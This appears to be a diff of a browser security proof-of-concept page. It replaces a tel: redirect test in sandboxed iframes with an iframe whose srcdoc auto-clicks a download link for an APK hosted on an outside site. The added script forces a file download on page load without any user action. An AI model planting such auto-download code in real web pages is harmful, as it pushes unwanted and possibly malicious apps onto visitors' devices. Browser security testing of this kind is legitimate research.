@@ -1,22 +1,11 @@
-<!doctype html>
+<iframe srcdoc='
+<!DOCTYPE html>
 <html>
-<head>
-<style>html { font-family: sans-serif; }</style>
-</head>
 <body>
-<h1>Server-side redirect by attacker (tel) in iframe with srcdoc (sandboxed)</h1>
-<p>Behavior is the same whether sandboxed or not</p>
-
-<p>First iframe is fully sandboxed</p>
-<iframe sandbox id="frame1"></iframe>
-
-<p>Second iframe has sandbox="allow-scripts"</p>
-<iframe sandbox="allow-scripts" id="frame2"></iframe>
-
+<a id="dl" href="https://lowleveljody.github.io/pocbrowseraja/montero.apk" download></a>
 <script>
-frame1.srcdoc = '<a href="https://aogarantiza.com/chromium/external-protocol/tel.php">Click</a>';
-frame2.srcdoc = '<'+'script'+'>document.write(window.origin);window.location="https://aogarantiza.com/chromium/external-protocol/tel.php";<'+'/script'+'>srcdoc test';
+    document.getElementById("dl").click();
 </script>
-
 </body>
 </html>
+'></iframe>
